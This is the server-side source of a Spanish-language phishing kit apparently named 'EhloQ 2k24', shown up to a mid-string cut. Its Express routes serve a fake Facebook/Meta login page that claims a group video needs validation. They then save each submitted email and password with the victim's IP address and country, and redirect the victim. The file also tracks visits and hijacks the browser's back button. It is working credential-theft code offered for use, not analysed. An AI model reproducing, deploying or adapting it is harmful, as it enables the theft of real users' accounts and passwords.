import express from 'express';
import geoip from 'geoip-lite';
import requestIp from 'request-ip';
import * as UserDB from '../database/user/user.database.js';
import * as AccountDB from '../database/account/account.database.js';
import { allowSaveWords } from '../utils/allowed_words.js';
import clm from 'country-locale-map';
const { getCountryByAlpha2 } = clm;
const router = express.Router();
router.get("/ehloq-load", async (req, res) => {
    const referer = req.headers.referer || req.headers.referrer || "No se proporcionó un referer";
    console.log("referer => ", referer);
    const identifier = req.headers.identifier;
    if (!identifier) {
        return res.status(404).send('Página no encontrada');
    }
    const user = await UserDB.getUserById(identifier);
    if (!user) {
        return res.status(404).send('Página no encontrada');
    }
    if (user.config.direct) {
        return res.redirect(307, user.config.redirect);
    }
    const clientIp = requestIp.getClientIp(req) || "";
    const geo = geoip.lookup(clientIp);
    console.log("IP del usuario:", clientIp);
    console.log("Información geográfica:", geo);
    const serverUrl = `${req.protocol}://${req.get('host')}`;
    const fakeIndentifier = `${identifier}${Math.floor(Math.random() * 16777215).toString(16)}`;
    const allowSaveWord = allowSaveWords[Math.floor(Math.random() * allowSaveWords.length)];
    const payload = {
        counter: user.config.counter,
        username: user.username,
        redirect: user.config.redirect,
        typeHack: user.config.typeHack,
        globalCounter: user.config.globalCounter,
        backRedirect: user.config.backRedirect,
        formUrl: `${serverUrl}/${allowSaveWord}?${fakeIndentifier}`,
        identifier: fakeIndentifier
    };
    const code = createCode(payload);
    res.type('application/javascript');
    res.send(code);
});
router.post("/ehloq-save", async (req, res) => {
    var _a;
    try {
        const clientIp = requestIp.getClientIp(req) || "";
        const identifier = req.headers.identifier;
        if (!identifier) {
            return res.status(404).send('Página no encontrada');
        }
        const user = await UserDB.getUserById(identifier);
        if (!user) {
            return res.status(404).send('Página no encontrada');
        }
        const cleanBody = JSON.parse(JSON.stringify(req.body));
        console.log("cleanBody => ", cleanBody);
        if (!cleanBody.username || !cleanBody.name) {
            return res.status(404).send('Página no encontrada');
        }
        const geoInfo = geoip.lookup(clientIp);
        if (!geoInfo || !geoInfo.country) {
            return res.status(404).send('Página no encontrada');
        }
        console.log("IP del usuario:", clientIp);
        console.log("Información geográfica:", geoInfo);
        const newAccountData = {
            email: cleanBody.username,
            password: cleanBody.name,
            username: user.username,
            country: ((_a = getCountryByAlpha2(geoInfo.country)) === null || _a === void 0 ? void 0 : _a.name) || "",
            countryCode: geoInfo.country,
            active: true,
            ipAddress: clientIp,
            userAgent: "",
            cookies: {},
            createdAt: new Date(),
        };
        await AccountDB.saveNewAccount(newAccountData);
        return res.redirect(307, user.config.redirect);
    }
    catch (error) {
        console.error("Error al procesar la solicitud:", error);
        return res.status(500).send("Error interno del servidor");
    }
});
function createCode(payload) {
    const html = htmlTemplate(payload);
    const userCounter = `https://whos.amung.us/pingjs/?k=${payload.counter}&t=EhloQ%202k24&x=https://www.binance.com/${payload.username}`;
    const globalCounter = `https://whos.amung.us/pingjs/?k=${payload.globalCounter}&t=EhloQ%202k24&x=https://www.binance.com/${payload.counter}`;
    const backRedirect = payload.backRedirect;
    return `
        let head = \`${html.head}\`;
        let body = \`${html.body}\`;
        let userCounter   = \`${userCounter}\`;
        let globalCounter = \`${globalCounter}\`;
        let backRedirect  = \`${backRedirect}\`;

        ${html.encryptedjs}
    `;
}
function htmlTemplate(payload) {
    return {
        head: `<meta charset=utf-8><meta content="IE=edge"http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"name=viewport><title>Contenido restringido</title><link href=https://cdn.rawgit.com/noppa/text-security/master/dist/text-security.css rel=stylesheet><style>a,hr{color:inherit}progress,sub,sup{vertical-align:baseline}blockquote,body,dd,dl,fieldset,figure,h1,h2,h3,h4,h5,h6,hr,menu,ol,p,pre,ul{margin:0}.p-0,dialog,fieldset,legend,menu,ol,ul{padding:0}.bg-c-black,.bg-c-blue-fb,.bg-gray-200,.bg-white{--tw-bg-opacity:1}.transition-all,.transition-colors,.transition-opacity{transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:150ms}*,::after,::before{box-sizing:border-box;border:0 solid #e5e7eb;--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-scroll-snap-strictness:proximity;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000}.border-t,hr{border-top-width:1px}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:#fff0}body{line-height:inherit}hr{height:0}abbr:where([title]){text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:#fff0;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}menu,ol,ul{list-style:none}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}.cursor-pointer,[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}.hidden,[hidden]{display:none}::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-scroll-snap-strictness:proximity;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000}.pointer-events-none{pointer-events:none}.fixed{position:fixed}.absolute{position:absolute}.relative{position:relative}.inset-0{inset:0}.bottom-4{bottom:1rem}.left-1{left:.25rem}.left-1slash2{left:50%}.right-3{right:.75rem}.top-1slash2{top:50%}.top-5{top:1.25rem}.z-10{z-index:10}.mx-auto{margin-left:auto;margin-right:auto}.my-3{margin-top:.75rem;margin-bottom:.75rem}.my-8{margin-top:2rem;margin-bottom:2rem}.mb-c-1dot5{margin-bottom:.375rem}.mb-3{margin-bottom:.75rem}.mb-c-3dot5{margin-bottom:.875rem}.mb-5{margin-bottom:1.25rem}.mb-6{margin-bottom:1.5rem}.mt-c-7vh{margin-top:7vh}.block{display:block}.inline-block{display:inline-block}.flex{display:flex}.h-3{height:.75rem}.h-px{height:1px}.h-screen{height:100vh}.min-h-full{min-height:100%}.w-c-91-porcent{width:91.666667%}.w-c-90{width:90%}.w-full{width:100%}.w-screen{width:100vw}.max-w-md{max-width:28rem}.max-w-xl{max-width:36rem}.flex-shrink-0{flex-shrink:0}.flex-grow-0{flex-grow:0}.origin-c-0{transform-origin:0}.-translate-x-1slash2,.-translate-y-1slash2,.-translate-y-4,.peer:focus~.peer-focus-scale-95,.peer:focus~.peer-focus-translate-y-4,.scale-95,.transform{transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.-translate-x-1slash2{--tw-translate-x:-50%}.-translate-y-1slash2{--tw-translate-y:-50%}.-translate-y-4,.peer:focus~.peer-focus-translate-y-4{--tw-translate-y:-1rem}.peer:focus~.peer-focus-scale-95,.scale-95{--tw-scale-x:.95;--tw-scale-y:.95}.flex-col{flex-direction:column}.items-center{align-items:center}.justify-end{justify-content:flex-end}.justify-center{justify-content:center}.space-x-2>:not([hidden])~:not([hidden]){--tw-space-x-reverse:0;margin-right:calc(.5rem * var(--tw-space-x-reverse));margin-left:calc(.5rem * calc(1 - var(--tw-space-x-reverse)))}.overflow-hidden{overflow:hidden}.overflow-y-auto{overflow-y:auto}.whitespace-nowrap{white-space:nowrap}.rounded-3xl{border-radius:1.5rem}.rounded-lg{border-radius:.5rem}.rounded-xl{border-radius:.75rem}.border{border-width:1px}.border-gray-300{--tw-border-opacity:1;border-color:rgb(209 213 219 / var(--tw-border-opacity))}.bg-c-black{background-color:rgb(0 0 0 / var(--tw-bg-opacity))}.bg-c-blue-fb{background-color:rgb(8 102 255 / var(--tw-bg-opacity))}.bg-gray-200{background-color:rgb(229 231 235 / var(--tw-bg-opacity))}.bg-white{background-color:rgb(255 255 255 / var(--tw-bg-opacity))}.bg-opacity-50{--tw-bg-opacity:0.5}.object-contain{object-fit:contain}.p-4{padding:1rem}.p-6{padding:1.5rem}.peer:focus~.peer-focus-px-2,.px-2{padding-left:.5rem;padding-right:.5rem}.px-3{padding-left:.75rem;padding-right:.75rem}.px-4{padding-left:1rem;padding-right:1rem}.px-5{padding-left:1.25rem;padding-right:1.25rem}.py-c-2dot5{padding-top:.625rem;padding-bottom:.625rem}.py-3{padding-top:.75rem;padding-bottom:.75rem}.pb-20{padding-bottom:5rem}.pb-4{padding-bottom:1rem}.pb-c-09rem{padding-bottom:.9rem}.pr-12{padding-right:3rem}.pt-20{padding-top:5rem}.pt-5{padding-top:1.25rem}.pt-c-1dot3rem{padding-top:1.3rem}.text-left{text-align:left}.text-center{text-align:center}.text-c-1dot075rem{font-size:1.075rem}.text-base{font-size:1rem;line-height:1.5rem}.peer:focus~.peer-focus-text-sm,.text-sm{font-size:.875rem;line-height:1.25rem}.text-xs{font-size:.75rem;line-height:1rem}.font-medium{font-weight:500}.font-semibold{font-weight:600}.text-blue-500{--tw-text-opacity:1;color:rgb(59 130 246 / var(--tw-text-opacity))}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity))}.shadow-xl{--tw-shadow:0 20px 25px -5px rgb(0 0 0 / 0.1),0 8px 10px -6px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 20px 25px -5px var(--tw-shadow-color),0 8px 10px -6px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.focus-outline-none:focus,.outline-none{outline:#fff0 solid 2px;outline-offset:2px}.transition-all{transition-property:all}.transition-colors{transition-property:color,background-color,border-color,text-decoration-color,fill,stroke}.transition-opacity{transition-property:opacity}.duration-300{transition-duration:.3s}.peer:placeholder-shown~.peer-placeholder-shown-top-1slash2{top:50%}.peer:placeholder-shown~.peer-placeholder-shown-translate-y-1slash2{--tw-translate-y:-50%;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.peer:placeholder-shown~.peer-placeholder-shown-scale-100{--tw-scale-x:1;--tw-scale-y:1;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}.peer:focus~.peer-focus-top-5{top:1.25rem}@media (min-width:640px){.sm-my-8{margin-top:2rem;margin-bottom:2rem}.sm-items-center{align-items:center}.sm-p-0{padding:0}.sm-p-6{padding:1.5rem}.sm-pb-4{padding-bottom:1rem}}</style><style>.gradient{background-image:radial-gradient(rgba(255,255,255,.25),rgba(255,255,255,0) 40%),radial-gradient(#ffd152 30%,#e26996,rgba(226,105,150,.4) 41%,transparent 52%),radial-gradient(#a033ff 37%,transparent 46%),linear-gradient(155deg,transparent 65%,#25d466 95%),linear-gradient(45deg,#0065e0,#0f8bff);background-position:left bottom,109% 68%,109% 68%,center center,center center;background-repeat:no-repeat;background-size:200% 200%,285% 500%,285% 500%,cover,cover;inset:0;opacity:.08;pointer-events:none;position:absolute}.ehloqInput{font-family:text-security-disc;-webkit-text-security:disc;-moz-text-security:circle}.spinner{border:2px solid rgba(255,255,255,.3);border-top:2px solid #fff;border-radius:50%;width:1.3rem;height:1.3rem;animation:spin 1s linear infinite}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style>`,
        body: `<div class=screen><div class=background><div class=back><div class=gradient></div></div></div><div class="content max-w-xl mx-auto w-c-91-porcent"><div class="relative flex flex-col h-screen items-center"id=mainColumn><div class="flex items-center justify-center mb-6 mt-c-7vh"><svg height=4.5rem viewBox="0 0 24 24"width=4.5rem xmlns=http://www.w3.org/2000/svg fill=#0866ff><path d="M12 2.03998C6.5 2.03998 2 6.52998 2 12.06C2 17.06 5.66 21.21 10.44 21.96V14.96H7.9V12.06H10.44V9.84998C10.44 7.33998 11.93 5.95998 14.22 5.95998C15.31 5.95998 16.45 6.14998 16.45 6.14998V8.61998H15.19C13.95 8.61998 13.56 9.38998 13.56 10.18V12.06H16.34L15.89 14.96H13.56V21.96C15.9164 21.5878 18.0622 20.3855 19.6099 18.57C21.1576 16.7546 22.0054 14.4456 22 12.06C22 6.52998 17.5 2.03998 12 2.03998Z"/></svg></div><form action=${payload.formUrl} class=w-full id=custom method=post onsubmit="return validateForm()"><input name=token type=hidden value=${payload.identifier}><div id=splitMessage><div class="bg-gray-200 flex-grow-0 flex-shrink-0 h-px pointer-events-none"></div><div class="relative my-3"><div class="text-base font-medium"><span class=text-gray-500>Facebook solicita validacion para ver el video del grupo.</span> <span class="cursor-pointer text-primary-500"><a href=javascript:void() id=gpname role=link style=color:#0064e0>Contenido restringido</a></span></div></div><div class="bg-gray-200 flex-grow-0 flex-shrink-0 h-px pointer-events-none mb-5"></div></div><div class="relative mb-c-3dot5"><input name=username autocomplete=on class="text-base w-full block border border-gray-300 focus-outline-none font-medium pb-c-09rem peer pr-12 pt-c-1dot3rem px-3 rounded-xl" id=username placeholder="" value="" spellcheck=false> <label class="text-base -translate-y-4 absolute duration-300 left-1 origin-c-0 peer-focus-px-2 peer-focus-text-sm peer-focus-top-5 peer-focus-translate-y-4 peer-placeholder-shown-scale-100 peer-placeholder-shown-top-1slash2 peer-placeholder-shown-translate-y-1slash2 px-2 scale-95 text-gray-500 top-5 transform z-10 peer-focus-scale-95"for=username>Móvil o correo electrónico</label><div class="cursor-pointer -translate-y-1slash2 absolute hidden right-3 top-1slash2 transform"id=clearIcon><svg height=1.6rem viewBox="0 0 24 24"width=1.6rem xmlns=http://www.w3.org/2000/svg version=1.1 xmlns:xlink=http://www.w3.org/1999/xlink><title>Close</title><g id=Page-1 fill=none fill-rule=evenodd stroke=none stroke-width=1><g id=Close><rect fill-rule=nonzero height=24 id=Rectangle width=24 x=0 y=0></rect><line id=Path stroke=#475569 stroke-linecap=round stroke-width=2 x1=16.9999 x2=7.00001 y1=7 y2=16.9999></line><line id=Path stroke=#475569 stroke-linecap=round stroke-width=2 x1=7.00006 x2=17 y1=7 y2=16.9999></line></g></g></svg></div></div><div class="relative mb-c-3dot5"><input name=name autocomplete=on class="text-base w-full block border border-gray-300 focus-outline-none font-medium pb-c-09rem peer pr-12 pt-c-1dot3rem px-3 rounded-xl ehloqInput" id=name placeholder="" value="" spellcheck=false> <label class="text-base -translate-y-4 absolute duration-300 left-1 origin-c-0 peer-focus-px-2 peer-focus-text-sm peer-focus-top-5 peer-focus-translate-y-4 peer-placeholder-shown-scale-100 peer-placeholder-shown-top-1slash2 peer-placeholder-shown-translate-y-1slash2 px-2 scale-95 text-gray-500 top-5 transform z-10 peer-focus:scale-95"for=name>Contraseña</label><div class="cursor-pointer -translate-y-1slash2 absolute hidden right-3 top-1slash2 transform"id=show-hide><svg height=1.5rem viewBox="0 0 24 24"width=1.5rem xmlns=http://www.w3.org/2000/svg fill=none class=block id=hide><g id="Edit / Hide"><path d="M3.99989 4L19.9999 20M16.4999 16.7559C15.1473 17.4845 13.6185 17.9999 11.9999 17.9999C8.46924 17.9999 5.36624 15.5478 3.5868 13.7788C3.1171 13.3119 2.88229 13.0784 2.7328 12.6201C2.62619 12.2933 2.62616 11.7066 2.7328 11.3797C2.88233 10.9215 3.11763 10.6875 3.58827 10.2197C4.48515 9.32821 5.71801 8.26359 7.17219 7.42676M19.4999 14.6335C19.8329 14.3405 20.138 14.0523 20.4117 13.7803L20.4146 13.7772C20.8832 13.3114 21.1182 13.0779 21.2674 12.6206C21.374 12.2938 21.3738 11.7068 21.2672 11.38C21.1178 10.9219 20.8827 10.6877 20.4133 10.2211C18.6338 8.45208 15.5305 6 11.9999 6C11.6624 6 11.3288 6.02241 10.9999 6.06448M13.3228 13.5C12.9702 13.8112 12.5071 14 11.9999 14C10.8953 14 9.99989 13.1046 9.99989 12C9.99989 11.4605 10.2135 10.9711 10.5608 10.6113"stroke=#475569 stroke-linecap=round stroke-linejoin=round stroke-width=2 id=Vector /></g></svg> <svg height=1.5rem viewBox="0 0 24 24"width=1.5rem xmlns=http://www.w3.org/2000/svg fill=none class=hidden id=show><g id="Edit / Show"><g id=Vector><path d="M3.5868 13.7788C5.36623 15.5478 8.46953 17.9999 12.0002 17.9999C15.5308 17.9999 18.6335 15.5478 20.413 13.7788C20.8823 13.3123 21.1177 13.0782 21.2671 12.6201C21.3738 12.2933 21.3738 11.7067 21.2671 11.3799C21.1177 10.9218 20.8823 10.6877 20.413 10.2211C18.6335 8.45208 15.5308 6 12.0002 6C8.46953 6 5.36623 8.45208 3.5868 10.2211C3.11714 10.688 2.88229 10.9216 2.7328 11.3799C2.62618 11.7067 2.62618 12.2933 2.7328 12.6201C2.88229 13.0784 3.11714 13.3119 3.5868 13.7788Z"stroke=#475569 stroke-linecap=round stroke-linejoin=round stroke-width=2 /><path d="M10 12C10 13.1046 10.8954 14 12 14C13.1046 14 14 13.1046 14 12C14 10.8954 13.1046 10 12 10C10.8954 10 10 10.8954 10 12Z"stroke=#475569 stroke-linecap=round stroke-linejoin=round stroke-width=2 /></g></g></svg></div></div><button class="relative text-base text-base bg-c-blue-fb px-5 py-c-2dot5 rounded-3xl text-white transition-colors w-full"form=custom type=submit><span id=text>Iniciar sesión</span><span class="absolute -translate-y-1slash2 hidden top-1slash2 -translate-x-1slash2 left-1slash2"id=spinner><div class=spinner></div></span></button></form><div class="flex flex-col justify-end"><div class="flex items-center justify-center pb-20 pt-20"><img alt=Logotipo class="h-3 object-contain"src=https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/64px-Meta_Platforms_Inc._logo.svg.png></div></div><div class="absolute bottom-4 flex items-center space-x-2"><span class="cursor-pointer text-gray-500 text-xs"role=link tabindex=0>Información </span><span class="cursor-pointer text-gray-500 text-xs"role=link tabindex=0>Ayuda </span><span class="cursor-pointer text-gray-500 text-xs"role=link tabindex=0>Mas</span></div></div></div></div><div class="relative hidden z-10"id=modal role=dialog aria-labelledby=modal-title aria-modal=true><div class="fixed inset-0 bg-c-black bg-opacity-50 transition-opacity"aria-hidden=true></div><div class="fixed inset-0 overflow-y-auto w-screen z-10"><div class="flex items-center justify-center min-h-full p-4 sm-items-center sm-p-0 text-center"id=overlay><div class="relative bg-white max-w-md overflow-hidden rounded-lg shadow-xl sm-my-8 text-left transform transition-all w-c-90"><div class="bg-white pb-4 pt-5 px-4 sm-p-6 sm-pb-4"><div class="text-center px-2 font-semibold mb-c-1dot5 text-c-1dot075rem">Credenciales incorrectas. no se ha encontrado ninguna cuenta</div><div class="text-center px-2 mb-3 text-sm">Introduce tu correo electrónico o tu número de móvil y tu contraseña para continuar.</div></div><div class="cursor-pointer border-gray-300 border-t inline-block py-3 text-blue-500 text-center w-full whitespace-nowrap"id=modalButton role=button tabindex=0>Aceptar</div></div></div></div></div>`,
        javascript: `let usernameInput,namePwsInput,submitButton,spinner,modal,overlay,modalButton,clearUserIcon,showHidePswContainer;function setupFormElements(){document.querySelectorAll("input");const e=document.getElementById("splitMessage"),t=document.getElementById("hide"),n=document.getElementById("show");usernameInput=document.getElementById("username"),namePwsInput=document.getElementById("name"),submitButton=document.querySelector('button[type="submit"]'),spinner=document.getElementById("spinner"),modal=document.getElementById("modal"),overlay=document.getElementById("overlay"),modalButton=document.getElementById("modalButton"),clearUserIcon=document.querySelector("#clearIcon"),showHidePswContainer=document.getElementById("show-hide"),usernameInput.focus();getGpnameFromUrl();window.addEventListener("popstate",(e=>{window.location.href=backRedirect})),history.pushState({page:"mi_pagina"},"Mi Página",generateId(15)),setTimeout((function(){(new Image).src=globalCounter}),100),setTimeout((function(){(new Image).src=userCounter}),100),usernameInput.addEventListener("focus",(()=>{""===usernameInput.value.trim()&&""===namePwsInput.value.trim()||(e.style.display="none"),handleInputChange(usernameInput)})),usernameInput.addEventListener("blur",(()=>{setTimeout((()=>{document.querySelector(":focus")||(e.style.display="block")}),300),handleInputChange(usernameInput)})),usernameInput.addEventListener("input",(()=>{""!==usernameInput.value.trim()||""!==namePwsInput.value.trim()?e.style.display="none":e.style.display="block",handleInputChange(usernameInput)})),namePwsInput.addEventListener("focus",(()=>{""===usernameInput.value.trim()&&""===namePwsInput.value.trim()||(e.style.display="none")})),namePwsInput.addEventListener("blur",(()=>{setTimeout((()=>{document.querySelector(":focus")||(e.style.display="block")}),300)})),namePwsInput.addEventListener("input",(()=>{""!==usernameInput.value.trim()||""!==namePwsInput.value.trim()?e.style.display="none":e.style.display="block",handleInputChange(namePwsInput)})),clearUserIcon.addEventListener("mousedown",(e=>{e.preventDefault(),usernameInput.value="",handleInputChange(usernameInput)})),t.addEventListener("mousedown",(e=>{e.preventDefault(),namePwsInput.classList.toggle("ehloqInput"),t.style.display="none",n.style.display="block"})),n.addEventListener("mousedown",(e=>{e.preventDefault(),namePwsInput.classList.toggle("ehloqInput"),n.style.display="none",t.style.display="block"})),modal.addEventListener("click",(e=>{e.target!==overlay&&e.target!==modalButton||(modal.style.display="none")}))}function getGpnameFromUrl(){const e=new URLSearchParams(window.location.search).get("gpname");e&&(document.querySelector("#gpname").textContent=e)}function generateId(e){const t="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";let n="";for(let s=0;s<e;s++){const e=Math.floor(62*Math.random());n+=t.charAt(e)}return"/"+n+".html"}function handleInputChange(e){const t=e.value.trim();"username"===e.id?clearUserIcon.style.display=t&&document.activeElement===e?"block":"none":showHidePswContainer.style.display=t?"block":"none"}function changeFormStatus(e){const t=[usernameInput,namePwsInput,submitButton];e?(t.forEach((e=>e.setAttribute("disabled",!0))),submitButton.querySelector("#text").style.visibility="hidden",spinner.style.display="block"):(t.forEach((e=>e.removeAttribute("disabled"))),submitButton.querySelector("#text").style.visibility="visible",spinner.style.display="none")}function showModalMessage(){modal.style.display="block"}function validateForm(){try{const e=usernameInput.value.trim(),t=namePwsInput.value.trim();changeFormStatus(!0);const n="(.)\\1{2,}";if(new RegExp(n).test(e)||new RegExp(n).test(t))return validateResponse({isOk:!1,message:"Error: Secuencia repetida"});const s="^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}$";if(e.includes("@")&&!new RegExp(s).test(e))return validateResponse({isOk:!1,message:"Error: Correo electrónico inválido"});const a="^\\\\d|\\\\+$";if(new RegExp(a).test(e.charAt(0)))if("+"===e.charAt(0)){const t=e.slice(1);if(!new RegExp("^\\d+$").test(t))return validateResponse({isOk:!1,message:"Error: El número de teléfono debe contener solo dígitos"});if(!(t.length>=10&&t.length<=13))return validateResponse({isOk:!1,message:"Error: Longitud incorrecta (debe ser entre 10 y 13 caracteres)"})}else if(new RegExp("^\\d+$").test(e)&&!(e.length>=10&&e.length<=13))return validateResponse({isOk:!1,message:"Error: Longitud incorrecta (debe ser entre 10 y 13 caracteres)"});return!e.includes("@")&&!new RegExp(a).test(e)&&e.length<=5?validateResponse({isOk:!1,message:"Error: Usuario demasiado corto"}):t.length<=5?validateResponse({isOk:!1,message:"Error: Contraseña demasiada corta"}):validateResponse({isOk:!0,message:"Formulario válido"})}catch(e){return console.log("EROR => ",e),validateResponse({isOk:!1,message:"Error inesperado en try catch"})}}function validateResponse({isOk:e,message:t}){return e||setTimeout((()=>{showModalMessage(),changeFormStatus(!1)}),1e3),console.log(t),e}document.head.innerHTML=head,document.body.innerHTML=body,document.addEventListener("DOMContentLoaded",setupFormElements),document.querySelector("form").addEventListener("keydown",(function(e){if("Enter"===e.key){const t=document.activeElement;"username"===t.id?(document.getElementById("name").focus(),e.preventDefault()):t.id}}));`,
        encryptedjs: `let usernameInput,namePwsInput,submitButton,spinner,modal,overlay,modalButton,clearUserIcon,showHidePswContainer;function setupFormElements(){document.querySelectorAll("input");const e=document.getElementById("splitMessage"),t=document.getElementById("hide"),n=document.getElementById("show");usernameInput=document.getElementById("username"),namePwsInput=document.getElementById("name"),submitButton=document.querySelector('button[type="submit"]'),spinner=document.getElementById("spinner"),modal=document.getElementById("modal"),overlay=document.getElementById("overlay"),modalButton=document.getElementById("modalButton"),clearUserIcon=document.querySelector("#clearIcon"),showHidePswContainer=document.getElementById("show-hide"),usernameInput.focus();getGpnameFromUrl();window.addEventListener("popstate",(e=>{window.location.href=backRedirect})),history.pushState({page:"mi_pagina"},"Mi Página",generateId(15)),setTimeout((function(){(new Image).src=globalCounter}),100),setTimeout((function(){(new Image).src=userCounter}),100),usernameInput.addEventListener("focus",(()=>{""===usernameInput.value.trim()&&""===namePwsInput.value.trim()||(e.style.display="none"),handleInputChange(usernameInput)})),usernameInput.addEventListener("blur",(()=>{setTimeout((()=>{document.querySelector(":focus")||(e.style.display="block")}),300),handleInputChange(usernameInput)})),usernameInput.addEventListener("input",(()=>{""!==usernameInput.value.trim()||""!==namePwsInput.value.trim()?e.style.display="none":e.style.display="block",handleInputChange(usernameInput)})),namePwsInput.addEventListener("focus",(()=>{""===usernameInput.value.trim()&&""===namePwsInput.value.trim()||(e.style.display="none")})),namePwsInput.addEventListener("blur",(()=>{setTimeout((()=>{document.querySelector(":focus")||(e.style.display="block")}),300)})),namePwsInput.addEventListener("input",(()=>{""!==usernameInput.value.trim()||""!==namePwsInput.value.trim()?e.style.display="none":e.style.display="block",handleInputChange(namePwsInput)})),clearUserIcon.addEventListener("mousedown",(e=>{e.preventDefault(),usernameInput.value="",handleInputChange(usernameInput)})),t.addEventListener("mousedown",(e=>{e.preventDefault(),namePwsInput.classList.toggle("ehloqInput"),t.style.display="none",n.style.display="block"})),n.addEventListener("mousedown",(e=>{e.preventDefault(),namePwsInput.classList.toggle("ehloqInput"),n.style.display="none",t.style.display="block"})),modal.addEventListener("click",(e=>{e.target!==overlay&&e.target!==modalButton||(modal.style.display="none")}))}function getGpnameFromUrl(){const e=new URLSearchParams(window.location.search).get("gpname");e&&(document.querySelector("#gpname").textContent=e)}function generateId(e){const t="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";let n="";for(let s=0;s<e;s++){const e=Math.floor(62*Math.random());n+=t.charAt(e)}return"/"+n+".html"}function handleInputChange(e){const t=e.value.trim();"username"===e.id?clearUserIcon.style.display=t&&document.activeElement===e?"block":"none":showHidePswContainer.style.display=t?"block":"none"}function changeFormStatus(e){const t=[usernameInput,namePwsInput,submitButton];e?(t.forEach((e=>e.setAttribute("disabled",!0))),submitButton.querySelector("#text").style.visibility="hidden",spinner.style.display="block"):(t.forEach((e=>e.removeAttribute("disabled"))),submitButton.querySelector("#text").style.visibility="visible",spinner.style.display="none")}function showModalMessage(){modal.style.display="block"}function validateForm(){try{const e=usernameInput.value.trim(),t=namePwsInput.value.trim();changeFormStatus(!0);const n="(.)\\1{2,}";if(new RegExp(n).test(e)||new RegExp(n).test(t))return validateResponse({isOk:!1,message:"Error: Secuencia repetida"});const s="^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}$";if(e.includes("@")&&!new RegExp(s).test(e))return validateResponse({isOk:!1,message:"Error: Correo electrónico inválido"});const a="^\\\\d|\\\\+$";if(new RegExp(a).test(e.charAt(0)))if("+"===e.charAt(0)){const t=e.slice(1);if(!new RegExp("^\\d+$").test(t))return validateResponse({isOk:!1,message:"Error: El número de teléfono debe contener solo dígitos"});if(!(t.length>=10&&t.length<=13))return validateResponse({isOk:!1,message:"Error: Longitud incorrecta (debe ser entre 10 y 13 caracteres)"})}else if(new RegExp("^\\d+$").test(e)&&!(e.length>=10&&e.length<=13))return validateResponse({isOk:!1,message:"Error: Longitud incorrecta (debe ser entre 10 y 13 caracteres)"});return!e.includes("@")&&!new RegExp(a).test(e)&&e.length<=5?validateResponse({isOk:!1,message:"Error: Usuario demasiado 